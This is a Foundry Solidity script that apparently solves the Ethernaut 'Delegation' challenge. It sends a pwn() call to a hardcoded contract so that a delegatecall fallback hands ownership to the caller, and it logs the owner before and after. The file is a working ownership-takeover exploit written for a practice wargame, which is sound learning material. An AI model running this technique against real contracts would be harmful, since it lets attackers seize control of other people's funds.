// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/06-Delegation.sol";


contract Exp is Script {

    Delegation public DelegationInstance = Delegation(payable(0xda27d804D0652034A6b05a91982556399960694d));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(hacker);
        console.log("My Address: ", owner);
        console.log("owner: ", DelegationInstance.owner());
        address(DelegationInstance).call(abi.encodeWithSignature("pwn()"));
        console.log("new owner: ", DelegationInstance.owner());

        vm.stopBroadcast();
    }
}
